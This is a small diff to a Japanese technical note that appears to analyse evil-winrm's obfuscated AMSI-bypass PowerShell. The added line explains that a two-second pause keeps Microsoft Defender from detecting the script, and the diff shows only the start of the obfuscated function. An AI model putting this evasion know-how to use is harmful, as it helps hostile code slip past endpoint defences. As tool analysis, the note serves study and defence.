@@ -121,6 +121,7 @@ _".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
 ```
 AMSIをバイバスるるためにPowershellが実行される  
 このPowershellは、evil-winrmのコード上では難読化されている
+ちなみにこのPowershellを一気に実行するとDefenderでは検知されるので、「#jamp」コードで２秒待機するようになっている
 ```powershell
 FUncTIon Get-PZ2zmpurexnDXVSxx {
     Param ($ljOHgifgLteNDYGV, $HWN81YY7isiEXwOd)
